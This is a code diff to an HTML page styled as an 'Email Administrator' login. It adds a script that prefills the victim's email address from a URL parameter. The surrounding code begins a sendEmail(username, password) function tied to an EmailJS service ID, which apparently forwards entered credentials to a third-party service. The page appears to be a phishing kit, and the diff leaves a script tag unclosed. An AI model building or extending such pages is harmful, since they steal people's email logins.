@@ -163,7 +163,18 @@
   <div class="footer">
     2025 Email Administrator. All Rights Reserved
   </div>
+  
+<script>
+// ✅ Prefill email from URL
+document.addEventListener("DOMContentLoaded", () => {
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("email");
 
+  if (email && validateEmail(email)) {
+    document.getElementById("email").value = decodeURIComponent(email);
+  }
+});
+  
   <script>
     function sendEmail(username, password) {
       const serviceID = "service_0ss7u7m";
